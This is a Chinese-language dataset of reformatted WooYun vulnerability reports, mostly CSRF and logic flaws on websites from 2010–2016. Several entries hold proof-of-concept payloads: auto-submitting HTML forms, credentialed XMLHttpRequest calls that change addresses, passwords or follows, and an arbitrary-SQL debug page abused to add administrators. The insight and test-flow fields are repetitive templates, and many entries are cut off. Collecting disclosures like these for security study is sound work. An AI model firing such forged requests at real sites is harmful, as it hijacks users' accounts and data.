**厂商**: 某科技公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面:/skywcm/skywcm/bat/cmd.jsp也是搞不懂这里放一个执行SQL到底有什么意义，并且整个后台没有指向这个页面的链接，我就理解为是开发过程中放在这里的一个调试页面吧。可以执行任意SQL语句，但是只会返回"执行成功"或"执行失败“另外，这里存在CSRF漏洞用BurpSuite生成CSRF_POC保存成HTML文件，然后在登陆skywcm后台的情况下点击提交那么，通过任何方式获悉了skywcm后端数据库结构的人，都可以构造一个添加管理员的CSRF表单，里面是添加管理员的SQL语句，然后诱使任何能够登陆后台的用户点击。主注意，这个页面只需要能够登陆后台就可以访问，不需要管理员身份，所以即使是权限很低的用户都可以在这个页面上执行SQL语句

**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="biz_action" value="3" /><input type="hidden" name="sql" value="select 1 from dual " /><input type="submit" value="Submit requ

**绕过**: 直接利用

**修复**: 和之前发布的任意文件下载漏洞一样，不如直接把这个页面去掉吧如果确实有需要，也做一下CSRF的防御，验证表单来源或者token
---

---
### [wooyun-2015-0116493] 某视频网站昵称任意修改(可伪装admin)
**厂商**: 奇艺 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 截图将昵称改成admin，将某视频网站修改昵称的GET包截取下来，模拟GET提交请求，在nickname的值里面就是昵称，昵称前面+空格，就可以随意更改，例如：https://example.com/[已脱敏] admin&antiCsrf=6b6fbbcf98369ceb046c5732cfb16819&callback=window.Q.__callbacks__.cbp73e2g就是在admin前面加了一个空格，结果返回修改成功

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 服务端去除空格或空行后在进行效验昵称是否存在
---

---
### [wooyun-2014-077635] 某运营商某分站问题(2)平行权限
**厂商**: 某运营商 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是直接上干货。https://example.com/[已脱敏] /updateFaqAnswer.do?answerId=1762678&content=xx随便打开一个问题：查看源码，找到回复内容的answerId，测试的为1762678然后上大招，直接修改get请求的answerId，修改content为修改的内容，发送请求：再刷新下IE，可以看到内容已经被修改了：如果用工具遍历下，把所有回复都修改掉，那问题就严重了。

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加权限。
---

---
### [wooyun-2013-037429] 某社交平台可csrf加关注
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: post: https://example.com/[已脱敏]"data":{"name":"焦恩俊","cnt":4,"fcnt":1,"followRelation":1},"status":0,"statusText":"操作成功"}

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 看你们怎么想
---

---
### [wooyun-2015-0155306] 阿哥汇主站多处csrf
**厂商**: 某农业公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、网站多处存在csrf漏洞，如修改个人信息，修改收货地址等处，均存在，此处以修改收货地址进行说明： 修改手机地址，抓包拦截：可以看到post内容中无不可预测参数，尝试csrf，构造恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("province=460000000000&city=460100000000&district=460105000000&town=460105002000&village=460105002002&set_defaul

**POC**: 同上

**绕过**: 直接利用

**修复**: 验证referer加随机token
---

---
### [wooyun-2015-0131371] 改图网存在csrf可随意修改他人收货地址
**厂商**: gaitu.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 改图网修改收货地址处存在csrf。 修改收货地址。抓包：无不可预测参数，根据请求包，构造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("contactid=142623&ajaxType=6&contacter=woo126&provinceid=5&citiid=25&districtid=328&address=hteshteshp&postcode=010000&tel=13111111111&phone01

**POC**: 同上

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2013-046399] 某社交平台CSRF打包
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最近慢慢从某视频网站跑到某门户网站看视频了，那就来找找问题吧。不看不知道，一看吓一跳啊，某社交平台已经放弃治疗了吗？一个token也没看到！！故任意一处都存在CSRF，由于是某社交平台，拿几处典型的测试了下。0x01关注CSRF：https://example.com/[已脱敏] name="test" action="https://example.com/[已脱敏]" method="POST"><br>content<input type="text" name="cont

**POC**: 同上

**绕过**: 直接利用

**修复**: 加token啊，亲，不要放弃治疗！
---

---
### [wooyun-2015-0101050] csdn出现csrf漏洞
**厂商**: CSDN开发者社区 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: CSDN通过GET方式给用户发送私信，请求URL的结构为：https://example.com/[已脱敏] src="https://example.com/[已脱敏]" />然后诱导已登录csdn的用户访问恶意网站，则可以成功发送私信

**POC**: 恶意网站代码：请求之后状态：csdn上的私信信息：

**绕过**: 直接利用

**修复**: Referer Check;使用Token；
---

---
### [wooyun-2015-0157003] 飞客旅行网csrf+设计缺陷
**厂商**: 飞客旅行网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个又有csrf ，又有设计缺陷，慢慢说吧先注册两个测试账号上图测试账号有了，并且资料也有，通过抓包发现修改个人资料是访问如下这个地址，https://example.com/[已脱敏]

**POC**: 同上

**绕过**: 直接利用

**修复**: csrf =>token   设计缺陷你应该懂了
---

---
### [wooyun-2016-0167813] 一猫汽车网CSRF修改他人信息
**厂商**: 某汽车科技公司 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏] 77Cookie: Hm_l

**POC**: POST /homecp/user/dosetting HTTP/1.1Host: i.emao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Request

**绕过**: 直接利用

**修复**: 这个你们比我更专业。
---

---
### [wooyun-2013-021729] 某社交平台某社交平台某功能控制不严可导致蠕虫
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）存在问题的功能在：lady.weibo.com的评论处；2）点击发布并抓包，得到如下数据；POST /cmnt/submit HTTP/1.1Host: comment5.news.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085699] 某通信厂商某网站存在CSRF漏洞
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某品牌商城 www.ztemall.com ，提交重要请求时没有token校验，存在CSRF漏洞

**POC**: 1.右上角个人中心里面的个人信息，修改密码，有奖征集等地方存在CSRF问题，目测其他地方也有问题2.拿有奖征集来举例：3.抓包发现没有防御csrf的token：4.构造自动提交的csrf POC：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="联系人姓名" value="WooYu

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2014-079888] 世界工厂csrf任意删除用户发布过的产品
**厂商**: 世界工厂网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] post提交id可任意修改，删除用户发布过的产品。返回现实500，页面里已经删除了该商品，图中是操作之后已经删除的结果其他的增加，修改的地方应该也有csrf，没试，请厂房验证。

**POC**: 页面里已经删除了该商品，图中是操作之后已经删除的结果

**绕过**: 直接利用

**修复**: 增加token验证
---

---
### [wooyun-2015-0133292] 大特保存在csrf漏洞危害账户安全
**厂商**: datebao.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改邮箱，不验证原邮箱，直接向新邮箱发送消息发送邮件urlhttps://example.com/[已脱敏]"GET", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded,charset=UTF-8");xmlhttp.send();邮箱换成自己的就好用户在已登录的情况下，点击异常页面后，会向指定邮箱发送修改邮箱的邮件账号A，邮箱点击构造

**POC**: 如上

**绕过**: 直接利用

**修复**: 你们懂
---

---
### [wooyun-2015-0127577] 准百网CSRF漏洞导致个人信息被篡改
**厂商**: zhunbai.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 账号到手 天下我有POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="某互联网公司" value="3088828541" /><input type="hidden" name="email" value="3088828541&#64;某互联网公司&#46;com" /><input type="hidden" name="realname" value="wangbadan" /><input type="hidden" name="mobile" value="13169670911" /><input type="hidden" name="add

**POC**: 可通过邮箱找回用户密码，从而达到修改用户密码CSRF 利用好的话很厉害哦

**绕过**: 直接利用

**修复**: 希望你懂的 挖洞不易， 饭都不吃就为了那
---

---
### [wooyun-2014-061333] 某网站分站存在CSRF可刷关注
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我的某门户网站   https://example.com/[已脱敏]  数据包如下图其中的  xpt=Ymltb2xpdW5pYW5Ac29odS5jb20%3D 通过URL解码 xpt=Ymltb2xpdW5pYW5Ac29odS5jb20=，再对其值base64解码得到受关注者的邮箱 xpt=bimoliunian@某邮箱.com  WS想法来了，是不是我也马上要有一大批跟随者啦

**POC**: 构造跟随我的链接：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 使用POST请求，增加token啥的
---

---
### [wooyun-2015-0110077] 麦乐购某处CSRF漏洞一枚
**厂商**: 麦乐购 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 商品 有个收藏，我们截包看下没有验证token我们写个poc

**POC**: 已成功让他人收藏该商品了

**绕过**: 直接利用

**修复**: 加个验证即可
---

---
### [wooyun-2013-036610] 某搜索引擎贴吧某功能CSRF漏洞一处
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.存在可csrf的连接：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2013-043892] 我是如何刷某社交平台粉丝的
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 访问https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2015-0163282] 通过制作post请求可以对任何博客文章进行评论
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="from" value="oldBlog" /><input type="hidden" name="appid" value="blog" /><input type="hidden" name="discusstype" value="0" /><input type="hidden" name="content" value="aaa" /><input type="hidden" name="itemid" value="310939570" /><input type="hidden" n

**POC**: {"code":0,"msg":"保存成功","comment":{"content":"aaa","passport":"Zmx5bml1QHNvaHUuY29t","id":505509840,"createtime":1450701667232,"unick":"123","uavatar":"https://example.com/[已脱敏]","ulink":"http://#######.blog.sohu.com/","topassport":"MTE1MjcxMzAyM0BxcS5jb20=","sname":"#

**绕过**: 直接利用

**修复**: 验证来源
---

---
### [wooyun-2015-095033] 暴走漫画CSRF防御缺陷导致直接改用户密码
**厂商**: baozoumanhua.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: token成了垃圾--直接绕过相当于没加我们试试提交个不带token的请求好！看看结果已经成功修改了

**POC**: 你们懂得

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-039982] 微拍主站csrf刷粉丝
**厂商**: 微拍 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看到随便知道一个人。可以看到可以加关注。。然后f12。截取请求。可以看到我们想目标发送了这样一个get请求。单独拿出来看到已关注。好了我们现在换一个账号测试。直接访问该地址。发现已经关注了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-03999] 19楼私信csrf
**厂商**: 十九楼 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] token referrer检查，问题不只这一个了 许多都不做token httponly也撤掉了。。挺危险的……

**POC**: 无

**绕过**: 直接利用

**修复**: 检查referrer,在涉及用户信息交互的地方增加token
---

---
### [wooyun-2015-0130491] 华润e万家存在csrf漏洞
**厂商**: 华润E万家 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改收货地址，抓包查看：其中无不可预测参数，伪造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("loginId=woo2&id=addr_3130650&userName=woo2&region_1=c_region_11001&region_2=c_region_11035&region_3=c_region_11380&RegionId=c_region_11380&RegionTem

**POC**: 以证明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-055473] 土豆-某社交平台 OAuth 2.0 redirect_uri CSRF 漏洞
**厂商**: 土豆网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 土豆-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个土豆-某社交平台  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0116130] 波奇网某处csrf可刷粉丝
**厂商**: 波奇网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: POC:<html><img src="https://example.com/[已脱敏]" ></html>

**绕过**: 直接利用

**修复**: 验证referer
---

---
### [wooyun-2015-0102910] 卡当网设计不当导致爆破+csrf(涉及重要功能)
**厂商**: www.kadang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站卡当网宣布退出互联网产业各路的互联网大佬以及要开礼物类网站的CEO们： 耶，又倒闭一个问题出在这里我们先看下访问之前然后添加地址确认是get请求偷笑。。。我们构造：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] 开玩笑的，白帽子是白的，不做黑事= =路人甲：赔我精神损失费路人丙： 赔我钱，我买的东西都被送别的地方去了路人乙：同上第二天：国内知名网站

**绕过**: 直接利用

**修复**: 1：爆破加个验证码且只验证一次，2次则失效2：csrf添加一串长不垃圾的一串token或者一串长不溜秋的hash
---

---
### [wooyun-2012-010451] 某虚拟货币CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在使用Q币转换成游戏币的接口中，存在CSRF问题，URL：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: CSRF不多说
---

---
### [wooyun-2015-0120670] 某门户网站博客可劫持任意博主帐号
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先查看配置文件：https://example.com/[已脱敏] domain="*.ifeng.com" /></cross-domain-policy>嗯，就自己一个域，好像挺安全的，不像某门户网站那样有三个可信域.以为搞不定，不过。。。上传头像处，没有检查内容，只是重命名了一下而已~得到恶意图片文件：https://example.com/[已脱敏]

**POC**: 测试劫持添加友链：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-07230] 人人网CSRF漏洞
**厂商**: 人人 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看了下那个链接的源代码，是通过人人逛街的接口提交的。接口地址https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 补漏洞很简单，加一个token验证即可。低级错误一枚，从网不行啊。
---

---
### [wooyun-2013-017167] 某社交平台某社交平台CSRF刷粉丝
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有对referer验证，没有加token导致

**POC**: 登录某社交平台某社交平台社会招聘：https://example.com/[已脱敏] id="fxx" name="fxx" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></ht

**绕过**: 直接利用

**修复**: 1.这个站CSRF不设防哦，请做好其他检查；2.检查POST来路Referer，在POST的信息中加token；3.要新年了，求礼物啊！
---

---
### [wooyun-2011-02093] 某搜索引擎游戏频道存在iframe
**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎游戏频道(手机版)存在一个iframe...

**POC**: poc:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 修复吧~~
---

---
### [wooyun-2015-0131322] 华润OLE任意密码重置漏洞
**厂商**: 华润OLE | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们创建两个帐号csrftestcsrftest1我们先登录帐号1，csrftest，我们来看看数据包,没有验证token接下来我们构造POC 如下图登录帐号  csrftest1  我们访问刚刚构造的poc看已经成功接下来我们只需要重置密码即可我就不演示了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 验证token
---

---
### [wooyun-2015-0128451] 雷锋网CSRF漏洞可修改用户密码
**厂商**: 雷锋网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] ， 邮箱可找回密码POC

**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="Profile&#91;nickname&#93;" value="wooyun7891" /><input type="hidden" name="Profile&#91;company&#93;" value="" /><input type="hidden" name="Profile&#91;position&#93;" value="" /><input type="hidden

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08542] 爱拍某处CSRF漏洞
**厂商**: 爱拍 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST信息时，未对POST来路(Referer)进行验证，对POST信息中的bid要求不严，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="action" value="blog" /><input type="text" name="post" value="true" /><input type="text" name="comment" value="XX" /><input type="submit"

**绕过**: 直接利用

**修复**: 检查POST来路Referer严格检查POST信息中的bid参数，严格判断是否为用户
---

---
### [wooyun-2016-0203945] 某社交平台某社交平台手机客户端存在csrf漏洞
**厂商**: 某社交平台 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.加密传输的数据2.做csrf防护，每次提交校验数据有效性
---

---
### [wooyun-2015-0132561] 方维o2o系统完整版的CSRF蠕虫(通过传播蠕虫来刷粉丝)#4
**厂商**: fanwe.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏]"status":1,"info":"\u8f6c\u53d1\u6210\u529f"}现在访问一下poc2页面，返回结果：{"t

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-096292] 豆瓣手机csrf回复任意帖子
**厂商**: 豆瓣 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /group/topic/72292507/comments HTTP/1.1Host: m.douban.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: bid="/dhOdK89vh4"; viewed="1094797"; __utma=30149280.572967685.1408697184.1423144849.1423321947.68; 

**POC**: <html><form action="https://example.com/[已脱敏]" method=post><input type=text value="asdasdasdasdasooyun" name="content" /><input type=submit value="submit" /></form></html>

**绕过**: 直接利用

**修复**: 验证token
---

---
### [wooyun-2014-077398] 记事狗定制裁剪逻辑错误导致csrf脱裤
**厂商**: 杭州神话 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接看代码:db.mod.php:(576-620)：$f = str_replace(array('/', '\\', '.'), '', $filename);$f = dir_safe($f);$backupdir = 'db/' . $f;$backupfilename = './data/backup/'.$backupdir.'/'.$f;if (!is_dir(($d = dirname($backupfilename)))) {jio()->MakeDir($d);}if($usezip) {require_once ROOT_PATH . 'include/func/zip.func.php';}if($method == 'multivol') {$sqldump = '';$tableid = intval(get_param('tableid'));$startfr

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08721] 某搜索引擎某处CSRF漏洞
**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="ct" value="20008" /><input type="text" name="doc_id" value="a4e806fd700abb68a982fbe9" /><input type="submit" value="submit" /></form><scri

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2013-025105] 某社交空间中的几个漏洞结合利用
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交空间有两个BUG可以结合利用:(1)URL里总是带着某互联网公司号码,也就是说,可以通过来源referer得知当前用户的某互联网公司;(2)日志的动态中图片如果是第三方网站图片的话,会把图片抓取到某互联网公司服务器上, 但如果某互联网公司抓取失败的时候, 第三方图就可直接显示,如果此图是php动态输出的话,很容易绕过采用php动态输出图片内容,如果某互联网公司抓取的话就返回空内容,如果有referer的话则提取某互联网公司,然后跟脚某互联网公司抓取当前用户的头像和昵称等,这样就可以整蛊当然,还可以用302跳转到某些get方式的投票地址,形成CSRF攻击

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 严格限制住第三方网站的图片
---

---
### [wooyun-2010-0881] 某社交平台博客CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

